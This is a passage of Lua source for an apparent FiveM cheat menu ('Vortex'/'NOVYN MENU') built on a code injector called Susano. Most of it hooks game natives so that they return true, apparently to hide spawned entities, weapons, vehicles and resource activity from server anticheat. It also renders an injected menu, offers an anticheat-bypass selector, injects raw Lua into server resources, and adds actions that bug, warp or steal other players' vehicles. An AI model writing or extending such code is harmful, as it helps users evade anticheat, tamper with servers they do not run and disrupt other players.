    Susano.HookNative(0xC906A7DAB05C8D2B, function(x, y, z, groundZ)
        if vortex_noclipEnabled then
            return false, true, z - 1.0
        end
        return true
    end)

    Susano.HookNative(0x3FEF770D40960D5A, function(entity)
        return true
    end)

    Susano.HookNative(0x06843DA7060A026B, function(entity)
        return true
    end)

    Susano.HookNative(0x239A3351AC1DA385, function(entity)
        return true
    end)

    Susano.HookNative(0x6B76DC1F3AE6E6A3, function(entity)
        return true
    end)

    Susano.HookNative(0x3882114BDE571D4F, function(entity)
        return true
    end)

    Susano.HookNative(0x9F47B057362C84B5, function(entity)
        return true
    end)

    Susano.HookNative(0x1C99BB7B6E96D16F, function(entity, x, y, z)
        return true
    end)

    Susano.HookNative(0x9A8D700A51CB7B0D, function(entity, relative)
        return true
    end)

    Susano.HookNative(0xAFBD61CC738D9EB9, function(entity, rotationOrder)
        return true
    end)

    Susano.HookNative(0x8524A8B0171D5E07, function(entity, x, y, z, rotationOrder)
        return true
    end)

    Susano.HookNative(0x0A794A5A57F8DF91, function(entity)
        return true
    end)

    Susano.HookNative(0x0E46A3FCBDE2A1B1, function(entity, speed)
        return true
    end)

    Susano.HookNative(0xD5037B82E0E03E, function(entity)
        return true
    end)

    Susano.HookNative(0xD80958FC74E988A6, function()
        return true
    end)

    Susano.HookNative(0x7DD959874C1FD534, function(ped)
        return true
    end)

    Susano.HookNative(0x9A9112A0FE9A4713, function(ped, p1)
        return true
    end)

    Susano.HookNative(0xE4970DBBFC8F0A5, function(ped)
        return true
    end)

    Susano.HookNative(0x262B14F48D29DE80, function(ped, componentId, drawableId, textureId, paletteId)
        return true
    end)

    Susano.HookNative(0x4C8B59171957BCF7, function(ped)
        return true
    end)

    Susano.HookNative(0xE3B6097CC25AA69E, function(ped)
        return true
    end)

    Susano.HookNative(0xF0A4F1BBF4CA7497, function(ped)
        return true
    end)

    Susano.HookNative(0xE0E854F5280FB769, function(ped)
        return true
    end)

    Susano.HookNative(0x9DCE1B0F061190AA, function(ped, toggle)
        return true
    end)

    Susano.HookNative(0x5C3B791D580E0BBC, function(entity, x, y, z)
        return true
    end)

    Susano.HookNative(0xF7AF4F159FF99F97, function(x, y, z, modelHash, p4)
        return true
    end)

    Susano.HookNative(0x5ACEF4C15B5158EF, function(vehicle, toggle)
        return true
    end)

    Susano.HookNative(0x45F6D8EEF34ABEF1, function(vehicle, health)
        return true
    end)

    Susano.HookNative(0xABC54DE641DC0FC, function(vehicle, health)
        return true
    end)

    Susano.HookNative(0x115722B1B9C14C1C, function(vehicle)
        return true
    end)

    Susano.HookNative(0x1FDA57E8908F2609, function(vehicle)
        return true
    end)

    Susano.HookNative(0x8FB233A3, function(vehicle, toggle)
        return true
    end)

    Susano.HookNative(0x79D3B596FE44EE8B, function(vehicle, dirtLevel)
        return true
    end)

    Susano.HookNative(0x1F2AA07F00B3217, function(vehicle, modType, modIndex, customTires)
        return true
    end)

    Susano.HookNative(0x1BB299305C3E8C13, function(vehicle, modType, toggle)
        return true
    end)

    Susano.HookNative(0x16DA8172459434AA, function(vehicle, tint)
        return true
    end)

    Susano.HookNative(0x6E13FC662B882D1D, function(vehicle, toggle)
        return true
    end)

    Susano.HookNative(0x7EE3A3A5FCE123F5, function(vehicle, extraId, disable)
        return true
    end)

    Susano.HookNative(0x7BEB0C28A64EC3, function(vehicle, extraId)
        return true
    end)

    Susano.HookNative(0xB664292EAECF7FA6, function(vehicle, doorLockStatus)
        return true
    end)

    Susano.HookNative(0x4C241E39B23DF869, function(vehicle, toggle)
        return true
    end)

    Susano.HookNative(0x2B5F9D2AF1F1722D, function(vehicle, owned)
        return true
    end)

    Susano.HookNative(0xAB54A698726D4B9F, function(vehicle, speed)
        return true
    end)

    Susano.HookNative(0x497420E022796B3F, function(vehicle)
        return true
    end)

    Susano.HookNative(0x34E710FF01247C5A, function(vehicle, health)
        return true
    end)

    Susano.HookNative(0xBA972B2C, function(vehicle, level)
        return true
    end)

    Susano.HookNative(0xC45D23BAF168AAB8, function(vehicle)
        return true
    end)

    Susano.HookNative(0xE6C5E2125EB210C1, function(vehicle)
        return true
    end)

    Susano.HookNative(0x0CF54F20DE4389C4, function(vehicle)
        return true
    end)

    Susano.HookNative(0xBB40DD2270B65366, function(entity)
        return true
    end)

    Susano.HookNative(0x9428447DED71FC7E, function(ped, vehicle, seatIndex)
        return true
    end)

    Susano.HookNative(0xEA23C49EAA83ACFB, function(x, y, z, heading, unk, p5)
        return true
    end)

    Susano.HookNative(0x423DE3854BB50894, function(player, toggle)
        return true
    end)

    Susano.HookNative(0x428CA6DBD1094446, function(entity, toggle)
        return true
    end)

    Susano.HookNative(0x163E252DE035A133, function(entity)
        return true
    end)

    Susano.HookNative(0x1A9205C1B9EE827F, function(entity, toggle, keepPhysics)
        return true
    end)

    Susano.HookNative(0x7234B202, function(entity)
        return true
    end)

    Susano.HookNative(0xAD738C3085FE7E11, function(entity, isMission, p2)
        return true
    end)

    Susano.HookNative(0x8FE2265A, function(ped)
        return true
    end)

    Susano.HookNative(0x4E3A0C4C, function(ped, amount)
        return true
    end)

    Susano.HookNative(0x9483C821, function(ped)
        return true
    end)

    Susano.HookNative(0x2B40A976, function(entity)
        return true
    end)

    Susano.HookNative(0x5324A0E3E4CE3570, function(entity)
        return true
    end)

    Susano.HookNative(0x8DE82BC774F3B862, function()
        return true
    end)

    Susano.HookNative(0x2C173AE2BDB9385E, function(bagName, key)
        return true
    end)

    Susano.HookNative(0x2B1813BA58063D36, function()
        return true
    end)

    Susano.HookNative(0x963D27A58DF860AC, function(modelHash)
        return true
    end)

    Susano.HookNative(0x98A4EB5D89A0C952, function(modelHash)
        return true
    end)

    Susano.HookNative(0xE532F5D78798DAAB, function(modelHash)
        return true
    end)

    Susano.HookNative(0xD24D37CC275948CC, function(modelName)
        return true
    end)

    Susano.HookNative(0xAF35D0D2583051B0, function(modelHash, x, y, z, heading, isNetwork, bScriptHostVeh)
        return true
    end)

    Susano.HookNative(0x00A1CADD00108836, function(modelHash)
        return true
    end)

    Susano.HookNative(0x580417101DDB492F, function(inputGroup, control)
        return true
    end)

    Susano.HookNative(0x50F940259D3841E6, function(inputGroup, control)
        return true
    end)

    Susano.HookNative(0xF3A21BCD95725A4A, function(inputGroup, control)
        return true
    end)

    Susano.HookNative(0xFE99B66D079CF6BC, function(inputGroup, control, disable)
        return true
    end)

    Susano.HookNative(0x1CEA6BFDF248E5D9, function(inputGroup, control, enable)
        return true
    end)

    Susano.HookNative(0x873C9F3104101DD3, function()
        return true
    end)

    Susano.HookNative(0x863F27B, function()
        return true
    end)

    Susano.HookNative(0x3C3C7B1B5EC08764, function(findIndex)
        return true
    end)

    Susano.HookNative(0x74732C6CA90DA2B4, function(resourceName)
        return true
    end)

    Susano.HookNative(0x776BFCC1, function(resourceName, metadataKey, index)
        return true
    end)

    Susano.HookNative(0x76A9EE1F, function(resourceName, fileName)
        return true
    end)

    Susano.HookNative(0x7FDD1128, function(eventName, ...)
        return true
    end)

    Susano.HookNative(0x5F2085, function(eventName, ...)
        return true
    end)

    Susano.HookNative(0x561C060B, function(commandString)
        return true
    end)

    Susano.HookNative(0x4E8DFD627A54C2E3, function()
        return true
    end)

    Susano.HookNative(0x4D2B787BAE9AB760, function(player)
        return true
    end)

    Susano.HookNative(0x6ED2A05C, function(player)
        return true
    end)

    Susano.HookNative(0x8377659F, function(rotationOrder)
        return true
    end)

    Susano.HookNative(0xE9E82A, function()
        return true
    end)

    Susano.HookNative(0x317B9A3, function()
        return true
    end)

    Susano.HookNative(0x376C5F, function(x, y, z)
        return true
    end)

    Susano.HookNative(0xE54E2827CEA4A74D, function(x, y, z, sizeX, sizeY, sizeZ, p6)
        return true
    end)

    Susano.HookNative(0x423DE3854BB50894, function(x, y, z)
        return true
    end)

    Susano.HookNative(0x8D3F3B01, function(ped, weaponHash)
        return true
    end)

    Susano.HookNative(0xBF0FD6E56C564FC, function(ped, weaponHash, ammoCount, isHidden, bForceInHand)
        return true
    end)

    Susano.HookNative(0x4899CB088EDF59B8, function(ped, weaponHash)
        return true
    end)

    Susano.HookNative(0xF25DF915FA38C5F3, function(ped, p1)
        return true
    end)

    Susano.HookNative(0x14E56BC5B5DB6A19, function(ped, weaponHash, ammoCount)
        return true
    end)

    Susano.HookNative(0x84808EF98B4B2B4E, function(ped)
        return true
    end)

    Susano.HookNative(0x867654CBC7606F2C, function(x1, y1, z1, x2, y2, z2, damage, isAudible, isInvisible, speed, p10, weaponHash, ownerPed, isNet, p14)
        return true
    end)

    Susano.HookNative(0x1897CA71, function(entity, offsetX, offsetY, offsetZ)
        return true
    end)
end

Citizen.CreateThread(function()
    -- Wait for injection loading to complete
    while not vortex_loadingComplete do Citizen.Wait(100) end
    local lastF5Press = false
    local lastUpPress = false
    local lastDownPress = false
    local lastEnterPress = false
    local lastBackPress = false
    local lastLeftPress = false
    local lastRightPress = false
    local lastQPress = false
    local lastEPress = false
    local lastHPress = false
    local lastGPress = false
    local lastF8Press = false
    local lastF8Time = GetGameTimer() + 5000
    local lastF9Press = false
    local last7Press = false
    local lastActionKeybinds = {}
    local lastLButtonPress = false
    local lastRButtonPress = false
    local lastScrollDelta = 0

    if Susano and Susano.GetAsyncKeyState then
        local _, f8State = Vortex_GetAsyncKeyState(VK.F8)
        lastF8Press = f8State
    end

    while true do
        Citizen.Wait(0)

        if vortex_waitingForKey then
            if not Vortex_SusanoReady() then
                Citizen.Wait(1000)
            else
                Susano.BeginFrame()

                local screenW, screenH = GetActiveScreenResolution()
                local boxW = 320
                local boxH = 110
                local boxX = (screenW - boxW) / 2
                local boxY = screenH - boxH - 60
                local headerHeight = VortexStyle.headerHeight

                Susano.DrawRectFilled(boxX, boxY, boxW, boxH,
                    VortexStyle.bgColor[1], VortexStyle.bgColor[2], VortexStyle.bgColor[3], VortexStyle.bgColor[4], VortexStyle.globalRounding)

                local topGray = 0.05
                local bottomBlack = 0.0
                local gradientSteps = 15
                local stepHeight = headerHeight / gradientSteps

                for step = 0, gradientSteps - 1 do
                    local stepY = boxY + (step * stepHeight)
                    local stepGradientFactor = step / (gradientSteps - 1)
                    local stepR = topGray - (stepGradientFactor * (topGray - bottomBlack))
                    local stepG = topGray - (stepGradientFactor * (topGray - bottomBlack))
                    local stepB = topGray - (stepGradientFactor * (topGray - bottomBlack))

                    Susano.DrawRectFilled(boxX, stepY, boxW, stepHeight,
                        stepR, stepG, stepB, VortexStyle.headerColor[4], VortexStyle.headerRounding)
                end

                local titleText = "NOVYN MENU"
                local titleWidth = Susano.GetTextWidth(titleText, VortexStyle.itemSize)
                local titleX = boxX + (boxW - titleWidth) / 2
                local titleY = boxY + (headerHeight / 2) - (VortexStyle.itemSize / 2) + 1

                Susano.DrawText(titleX, titleY, titleText, VortexStyle.itemSize,
                    VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], VortexStyle.textColor[4])

                local mainText = "Choose your menu key"
                local mainSize = VortexStyle.itemSize
                local mainWidth = Susano.GetTextWidth(mainText, mainSize)
                local mainX = boxX + (boxW - mainWidth) / 2
                local mainY = boxY + headerHeight + 20

                Susano.DrawText(mainX, mainY, mainText, mainSize,
                    VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], VortexStyle.textColor[4])

                local pulse = 0.3 + (math.abs(math.sin(GetGameTimer() / 350)) * 0.7)
                local pulseText = "Press any key..."
                local pulseSize = VortexStyle.itemSize - 2
                local pulseWidth = Susano.GetTextWidth(pulseText, pulseSize)
                local pulseX = boxX + (boxW - pulseWidth) / 2
                local pulseY = boxY + headerHeight + 46

                local pulseR = VortexStyle.accentColor[1] * pulse
                local pulseG = VortexStyle.accentColor[2] * pulse
                local pulseB = VortexStyle.accentColor[3] * pulse

                Susano.DrawText(pulseX, pulseY, pulseText, pulseSize,
                    pulseR, pulseG, pulseB, pulse)

                Susano.SubmitFrame()

                local commonKeys = {166, 167, 168, 169, 170, 121, 288, 289}
                for _, keyCode in ipairs(commonKeys) do
                    if vortex_isValidKeyboardKey(keyCode) and IsControlJustReleased(0, keyCode) then
                        vortex_menuKey = keyCode
                        vortex_waitingForKey = false
                        VortexMenu.isOpen = true
                        Vortex_ResetFrame()
                        break
                    end
                end

                if vortex_waitingForKey then
                    for _, keyCode in ipairs(vortex_validKeyboardKeys) do
                        if IsControlJustReleased(0, keyCode) then
                            vortex_menuKey = keyCode
                            vortex_waitingForKey = false
                            VortexMenu.isOpen = true
                            Vortex_ResetFrame()
                            break
                        end
                    end
                end
            end
        elseif vortex_waitingForActionKeybind then
            if VortexMenu.isOpen then
                DrawMenu()
            end

            if not Vortex_SusanoReady() then
                Citizen.Wait(1000)
            else
                Susano.BeginFrame()

                local screenW, screenH = GetActiveScreenResolution()
                local boxW = 320
                local boxH = 110
                local boxX = (screenW - boxW) / 2
                local boxY = screenH - boxH - 60
                local headerHeight = VortexStyle.headerHeight

                Susano.DrawRectFilled(boxX, boxY, boxW, boxH,
                    VortexStyle.bgColor[1], VortexStyle.bgColor[2], VortexStyle.bgColor[3], VortexStyle.bgColor[4], VortexStyle.globalRounding)

                local topGray = 0.05
                local bottomBlack = 0.0
                local gradientSteps = 15
                local stepHeight = headerHeight / gradientSteps

                for step = 0, gradientSteps - 1 do
                    local stepY = boxY + (step * stepHeight)
                    local stepGradientFactor = step / (gradientSteps - 1)
                    local stepR = topGray - (stepGradientFactor * (topGray - bottomBlack))
                    local stepG = topGray - (stepGradientFactor * (topGray - bottomBlack))
                    local stepB = topGray - (stepGradientFactor * (topGray - bottomBlack))

                    Susano.DrawRectFilled(boxX, stepY, boxW, stepHeight,
                        stepR, stepG, stepB, VortexStyle.headerColor[4], VortexStyle.headerRounding)
                end

                local titleText = "BIND KEY"
                local titleWidth = Susano.GetTextWidth(titleText, VortexStyle.itemSize)
                local titleX = boxX + (boxW - titleWidth) / 2
                local titleY = boxY + (headerHeight / 2) - (VortexStyle.itemSize / 2) + 1

                Susano.DrawText(titleX, titleY, titleText, VortexStyle.itemSize,
                    VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], VortexStyle.textColor[4])

                local actionLabel = Vortex_GetActionLabel(vortex_currentActionToBind or "action")
                local mainText = "Choose key for: " .. actionLabel
                local mainSize = VortexStyle.itemSize
                local mainWidth = Susano.GetTextWidth(mainText, mainSize)
                local mainX = boxX + (boxW - mainWidth) / 2
                local mainY = boxY + headerHeight + 20

                Susano.DrawText(mainX, mainY, mainText, mainSize,
                    VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], VortexStyle.textColor[4])

                local pulse = 0.3 + (math.abs(math.sin(GetGameTimer() / 350)) * 0.7)
                local pulseText = "Press any key..."
                local pulseSize = VortexStyle.itemSize - 2
                local pulseWidth = Susano.GetTextWidth(pulseText, pulseSize)
                local pulseX = boxX + (boxW - pulseWidth) / 2
                local pulseY = boxY + headerHeight + 46

                local pulseR = VortexStyle.accentColor[1] * pulse
                local pulseG = VortexStyle.accentColor[2] * pulse
                local pulseB = VortexStyle.accentColor[3] * pulse

                Susano.DrawText(pulseX, pulseY, pulseText, pulseSize,
                    pulseR, pulseG, pulseB, pulse)

                Susano.SubmitFrame()

                local commonKeys = {166, 167, 168, 169, 170, 121, 288, 289}
                for _, keyCode in ipairs(commonKeys) do
                    if vortex_isValidKeyboardKey(keyCode) and IsControlJustReleased(0, keyCode) then
                        if vortex_currentActionToBind then
                            vortex_actionKeybinds[vortex_currentActionToBind] = keyCode
                            local keyName = Vortex_GetKeyName(keyCode)
                            print("^2[KEYBIND] Keybind set for " .. vortex_currentActionToBind .. " to keyCode " .. keyCode .. " (displays as: " .. keyName .. ")^7")
                        end
                        vortex_waitingForActionKeybind = false
                        vortex_currentActionToBind = nil
                        Vortex_ResetFrame()
                        break
                    end
                end

                if vortex_waitingForActionKeybind then
                    for _, keyCode in ipairs(vortex_validKeyboardKeys) do
                        if IsControlJustReleased(0, keyCode) then
                            if vortex_currentActionToBind then
                                vortex_actionKeybinds[vortex_currentActionToBind] = keyCode
                                local keyName = Vortex_GetKeyName(keyCode)
                                print("^2[KEYBIND] Keybind set for " .. vortex_currentActionToBind .. " to key " .. keyCode .. " (" .. keyName .. ")^7")
                            end
                            vortex_waitingForActionKeybind = false
                            vortex_currentActionToBind = nil
                            Vortex_ResetFrame()
                            break
                        end
                    end
                end
            end
        else
            if not vortex_waitingForActionKeybind and not vortex_waitingForKey then
                for actionName, keyCode in pairs(vortex_actionKeybinds) do
                    if keyCode then
                        local lastPress = lastActionKeybinds[actionName] or false
                        local currentPress = IsControlJustPressed(0, keyCode)

                        if currentPress and not lastPress then
                            local action = vortex_actions[actionName]
                            if action then
                                action()

                                local actionLabel = Vortex_GetActionLabel(actionName)
                                if actionLabel then
                                    Vortex_Notify(actionLabel, actionName)
                                end
                            end
                        end

                        lastActionKeybinds[actionName] = currentPress
                    end
                end
            end

            local menuKeyIsActionKeybind = false
            if vortex_menuKey then
                for actionName, keyCode in pairs(vortex_actionKeybinds) do
                    if keyCode == vortex_menuKey then
                        menuKeyIsActionKeybind = true
                        break
                    end
                end
            end

            if IsControlJustReleased(0, vortex_menuKey) and not menuKeyIsActionKeybind then
                VortexMenu.isOpen = not VortexMenu.isOpen
                if VortexMenu.isOpen then
                    VortexMenu.currentCategory = "main"
                    VortexMenu.selectedIndex = 1
                    VortexMenu.currentTab = 1

                    local category = vortex_categories["main"]
                    if category then
                        local items = category.hasTabs and category.tabs[1].items or category.items
                        VortexMenu.selectedIndex = vortex_skipSeparator(items, 1)
                    end
                else
                    Vortex_ResetFrame()
                end
            end



            local _, gPressed = Vortex_GetAsyncKeyState(VK.G)
            if gPressed and not lastGPress then
                if vortex_miscTargetEnabled then
                    vortex_miscTargetInterfaceOpen = not vortex_miscTargetInterfaceOpen
                else
                    vortex_miscTargetEnabled = true
                    vortex_miscTargetInterfaceOpen = true
                end
            end
            lastGPress = gPressed

            if vortex_miscTargetEnabled and vortex_miscTargetInterfaceOpen then
                local scrollDelta = GetDisabledControlNormal(0, 14)

                if scrollDelta > 0.1 and scrollDelta ~= lastScrollDelta then
                    vortex_miscTargetSelectedOption = vortex_miscTargetSelectedOption + 1
                    if vortex_miscTargetSelectedOption > 4 then
                        vortex_miscTargetSelectedOption = 1
                    end
                    lastScrollDelta = scrollDelta
                elseif scrollDelta < -0.1 and scrollDelta ~= lastScrollDelta then
                    vortex_miscTargetSelectedOption = vortex_miscTargetSelectedOption - 1
                    if vortex_miscTargetSelectedOption < 1 then
                        vortex_miscTargetSelectedOption = 4
                    end
                    lastScrollDelta = scrollDelta
                elseif math.abs(scrollDelta) < 0.05 then
                    lastScrollDelta = 0
                end

                local _, lButtonPressed = Vortex_GetAsyncKeyState(VK.LBUTTON)
                if lButtonPressed and not lastLButtonPress then
                    local playerPed = PlayerPedId()
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(0)

                    local z = math.rad(camRot.z)
                    local x = math.rad(camRot.x)
                    local num = math.abs(math.cos(x))
                    local dirX = -math.sin(z) * num
                    local dirY = math.cos(z) * num
                    local dirZ = math.sin(x)

                    local distance = 200.0
                    local endX = camCoords.x + dirX * distance
                    local endY = camCoords.y + dirY * distance
                    local endZ = camCoords.z + dirZ * distance

                    local targetPlayerId = nil
                    local bestAngle = 10.0

                    for _, player in ipairs(GetActivePlayers()) do
                        if player ~= PlayerId() then
                            local targetPed = GetPlayerPed(player)
                            if DoesEntityExist(targetPed) then
                                local targetCoords = GetEntityCoords(targetPed)
                                local vecX = targetCoords.x - camCoords.x
                                local vecY = targetCoords.y - camCoords.y
                                local vecZ = targetCoords.z - camCoords.z
                                local distToCam = math.sqrt(vecX * vecX + vecY * vecY + vecZ * vecZ)

                                if distToCam > 0 then
                                    local normX = vecX / distToCam
                                    local normY = vecY / distToCam
                                    local normZ = vecZ / distToCam
                                    local dotProduct = dirX * normX + dirY * normY + dirZ * normZ
                                    local angle = math.acos(math.max(-1, math.min(1, dotProduct)))
                                    local angleDeg = math.deg(angle)

                                    if angleDeg < bestAngle then
                                        bestAngle = angleDeg
                                        targetPlayerId = GetPlayerServerId(player)
                                    end
                                end
                            end
                        end
                    end

                    if targetPlayerId then
                        VortexMenu.selectedPlayer = targetPlayerId

                        if vortex_miscTargetSelectedOption == 1 then
                            vortex_actions.warpvehicle()
                        elseif vortex_miscTargetSelectedOption == 2 then
                            vortex_actions.bugplayer()
                        elseif vortex_miscTargetSelectedOption == 3 then
                            VortexMenu.bugVehicleMode = "v1"
                            vortex_actions.bugvehicle()
                        elseif vortex_miscTargetSelectedOption == 4 then
                            vortex_actions.stealvehicle()
                        end
                    end
                end
                lastLButtonPress = lButtonPressed
            end

            if VortexMenu.isOpen then
                if vortex_editorModeEnabled then
                    local moveSpeed = 8.0
                    local screenW, screenH = GetActiveScreenResolution()

                    if IsControlPressed(0, 172) then
                        VortexStyle.y = math.max(0, VortexStyle.y - moveSpeed)
                    end
                    if IsControlPressed(0, 173) then
                        VortexStyle.y = math.min(screenH - 200, VortexStyle.y + moveSpeed)
                    end
                    if IsControlPressed(0, 174) then
                        VortexStyle.x = math.max(0, VortexStyle.x - moveSpeed)
                    end
                    if IsControlPressed(0, 175) then
                        VortexStyle.x = math.min(screenW - VortexStyle.width, VortexStyle.x + moveSpeed)
                    end
                else
                    local category = vortex_categories[VortexMenu.currentCategory]
                    local currentItems
                    if category.hasTabs then
                        local ct = category.tabs[VortexMenu.currentTab]
                        currentItems = ct and ct.items or {}
                    else
                        currentItems = category.items
                    end

                    local _, upPressed = Vortex_GetAsyncKeyState(VK.UP)
                    if upPressed and not lastUpPress then
                        VortexMenu.selectedIndex = VortexMenu.selectedIndex - 1
                        if VortexMenu.selectedIndex < 1 then
                            VortexMenu.selectedIndex = #currentItems
                        end
                        local maxAttempts = #currentItems
                        local attempts = 0
                        while currentItems[VortexMenu.selectedIndex] and currentItems[VortexMenu.selectedIndex].isSeparator and attempts < maxAttempts do
                            VortexMenu.selectedIndex = VortexMenu.selectedIndex - 1
                            if VortexMenu.selectedIndex < 1 then
                                VortexMenu.selectedIndex = #currentItems
                            end
                            attempts = attempts + 1
                        end
                    end
                    lastUpPress = upPressed

                    local _, downPressed = Vortex_GetAsyncKeyState(VK.DOWN)
                    if downPressed and not lastDownPress then
                        VortexMenu.selectedIndex = VortexMenu.selectedIndex + 1
                        if VortexMenu.selectedIndex > #currentItems then
                            VortexMenu.selectedIndex = 1
                        end
                        local maxAttempts = #currentItems
                        local attempts = 0
                        while currentItems[VortexMenu.selectedIndex] and currentItems[VortexMenu.selectedIndex].isSeparator and attempts < maxAttempts do
                            VortexMenu.selectedIndex = VortexMenu.selectedIndex + 1
                            if VortexMenu.selectedIndex > #currentItems then
                                VortexMenu.selectedIndex = 1
                            end
                            attempts = attempts + 1
                        end
                    end
                    lastDownPress = downPressed
                end

                local category = vortex_categories[VortexMenu.currentCategory]
                local currentItems
                if category and category.hasTabs then
                    local ct3 = category.tabs and category.tabs[VortexMenu.currentTab]
                    currentItems = ct3 and ct3.items or {}
                else
                    currentItems = category and category.items or {}
                end

                local _, qPressed = Vortex_GetAsyncKeyState(VK.Q)
                local _, ePressed = Vortex_GetAsyncKeyState(VK.E)

                if category.hasTabs and category.tabs then
                    if qPressed and not lastQPress then
                        VortexMenu.currentTab = VortexMenu.currentTab - 1
                        if VortexMenu.currentTab < 1 then
                            VortexMenu.currentTab = #category.tabs
                        end
                        local tab = category.tabs[VortexMenu.currentTab]
                        local items = tab and tab.items
                        VortexMenu.selectedIndex = vortex_skipSeparator(items, 1)
                    elseif ePressed and not lastEPress then
                        VortexMenu.currentTab = VortexMenu.currentTab + 1
                        if VortexMenu.currentTab > #category.tabs then
                            VortexMenu.currentTab = 1
                        end
                        local tab = category.tabs[VortexMenu.currentTab]
                        local items = tab and tab.items
                        VortexMenu.selectedIndex = vortex_skipSeparator(items, 1)
                    end
                end
                lastQPress = qPressed
                lastEPress = ePressed

                local _, leftPressed = Vortex_GetAsyncKeyState(VK.LEFT)
                local _, rightPressed = Vortex_GetAsyncKeyState(VK.RIGHT)

                if (leftPressed and not lastLeftPress) or (rightPressed and not lastRightPress) then
                    local item = currentItems[VortexMenu.selectedIndex]
                    if item then
                        if item.action == "noclipbind" then
                            if leftPressed then
                                vortex_noclipSpeed = math.max(1.0, vortex_noclipSpeed - 1.0)
                            else
                                vortex_noclipSpeed = math.min(20.0, vortex_noclipSpeed + 1.0)
                            end
                        elseif item.action == "freecam" then
                            if leftPressed then
                                vortex_freecamSpeed = math.max(0.1, vortex_freecamSpeed - 0.1)
                            else
                                vortex_freecamSpeed = math.min(5.0, vortex_freecamSpeed + 0.1)
                            end
                            freecamSpeed = vortex_freecamSpeed
                            if _G.vortexFreecam then
                                _G.vortexFreecam.cameraSpeed = vortex_freecamSpeed
                            end
                        elseif item.action == "drawfov" then
                            if leftPressed then
                                vortex_fovRadius = math.max(50.0, vortex_fovRadius - 10.0)
                            else
                                vortex_fovRadius = math.min(300.0, vortex_fovRadius + 10.0)
                            end
                        elseif item.action == "easyhandling" then
                            if leftPressed then
                                vortex_handlingAmount = math.max(10.0, vortex_handlingAmount - 5.0)
                            else
                                vortex_handlingAmount = math.min(100.0, vortex_handlingAmount + 5.0)
                            end
                            if vortex_easyhandlingEnabled then
                                local rawCode = string.format([[
rawset(_G, 'easy_handling_amount', %d)
if rawget(_G, 'NvGhJkLpOiUy') then
  local ped = PlayerPedId()
  local veh = GetVehiclePedIsIn(ped, false)
  if veh and veh ~= 0 then
    local gravity = 9.8 + (%d / 50.0) * 63.2
    SetVehicleGravityAmount(veh, gravity)
  end
end
]], vortex_handlingAmount, vortex_handlingAmount)
                                Susano.InjectResource("any", rawCode)
                            end
                        elseif item.action == "health" then
                            if leftPressed then
                                vortex_healthValue = math.max(0.0, vortex_healthValue - 1.0)
                            else
                                vortex_healthValue = math.min(100.0, vortex_healthValue + 1.0)
                            end
                        elseif item.action == "armour" then
                            if leftPressed then
                                vortex_armourValue = math.max(0.0, vortex_armourValue - 1.0)
                            else
                                vortex_armourValue = math.min(100.0, vortex_armourValue + 1.0)
                            end
                        elseif item.hasSelector and item.action == "teleport" then
                            if VortexMenu.teleportMode == "player" then
                                VortexMenu.teleportMode = "vehicle"
                            else
                                VortexMenu.teleportMode = "player"
                            end
                        elseif item.hasSelector and item.action == "tptoocean" then
                            local locations = {"ocean", "mazebank", "sandyshores"}
                            local currentIndex = 1
                            for i, loc in ipairs(locations) do
                                if loc == VortexMenu.tpLocation then
                                    currentIndex = i
                                    break
                                end
                            end

                            if leftPressed then
                                currentIndex = currentIndex - 1
                                if currentIndex < 1 then currentIndex = #locations end
                            else
                                currentIndex = currentIndex + 1
                                if currentIndex > #locations then currentIndex = 1 end
                            end

                            VortexMenu.tpLocation = locations[currentIndex]
                        elseif item.hasSelector and item.action == "menutheme" then
                            local themeNames = {}
                            for name, _ in pairs(vortex_themes) do
                                table.insert(themeNames, name)
                            end
                            table.sort(themeNames)

                            if #themeNames > 0 then
                                local currentIndex = 1
                                for i, name in ipairs(themeNames) do
                                    if name == vortex_currentTheme then
                                        currentIndex = i
                                        break
                                    end
                                end

                                if leftPressed then
                                    currentIndex = currentIndex - 1
                                    if currentIndex < 1 then currentIndex = #themeNames end
                                else
                                    currentIndex = currentIndex + 1
                                    if currentIndex > #themeNames then currentIndex = 1 end
                                end

                                vortex_currentTheme = themeNames[currentIndex]
                                local theme = vortex_themes[vortex_currentTheme] or vortex_themes[themeNames[1]]
                                if theme then
                                    VortexBanner.imageUrl = theme.banner
                                    vortex_bannerTexture = nil
                                    vortex_bannerWidth = 0
                                    vortex_bannerHeight = 0
                                    Vortex_LoadBannerTexture(VortexBanner.imageUrl)

                                    local color = theme.color or {1.0,1.0,1.0}
                                    VortexStyle.accentColor[1] = color[1]
                                    VortexStyle.accentColor[2] = color[2]
                                    VortexStyle.accentColor[3] = color[3]

                                    VortexStyle.selectedColor[1] = color[1]
                                    VortexStyle.selectedColor[2] = color[2]
                                    VortexStyle.selectedColor[3] = color[3]

                                    VortexStyle.scrollbarThumb[1] = color[1]
                                    VortexStyle.scrollbarThumb[2] = color[2]
                                    VortexStyle.scrollbarThumb[3] = color[3]

                                    VortexStyle.tabActiveColor[1] = color[1]
                                    VortexStyle.tabActiveColor[2] = color[2]
                                    VortexStyle.tabActiveColor[3] = color[3]
                                end
                            end
                        elseif item.hasSelector and item.action == "keybinds_position" then
                            if leftPressed then
                                vortex_keybindsPosition = vortex_keybindsPosition - 1
                                if vortex_keybindsPosition < 1 then vortex_keybindsPosition = #vortex_keybindsPositionOptions end
                            else
                                vortex_keybindsPosition = vortex_keybindsPosition + 1
                                if vortex_keybindsPosition > #vortex_keybindsPositionOptions then vortex_keybindsPosition = 1 end
                            end
                        elseif item.hasSelector and item.action == "bypassac" then
                            if leftPressed then
                                vortex_selectedBypassAC = vortex_selectedBypassAC - 1
                                if vortex_selectedBypassAC < 1 then vortex_selectedBypassAC = #vortex_bypassACOptions end
                            else
                                vortex_selectedBypassAC = vortex_selectedBypassAC + 1
                                if vortex_selectedBypassAC > #vortex_bypassACOptions then vortex_selectedBypassAC = 1 end
                            end
                        elseif item.hasSelector and item.action == "selectmode" then
                            if vortex_selectMode == "all" then
                                vortex_selectMode = "none"
                            else
                                vortex_selectMode = "all"
                            end
                        elseif item.hasSelector and item.action == "nocliptype" then
                            if leftPressed then
                                vortex_selectedNoclipType = vortex_selectedNoclipType - 1
                                if vortex_selectedNoclipType < 1 then vortex_selectedNoclipType = #vortex_noclipTypeOptions end
                            else
                                vortex_selectedNoclipType = vortex_selectedNoclipType + 1
                                if vortex_selectedNoclipType > #vortex_noclipTypeOptions then vortex_selectedNoclipType = 1 end
                            end
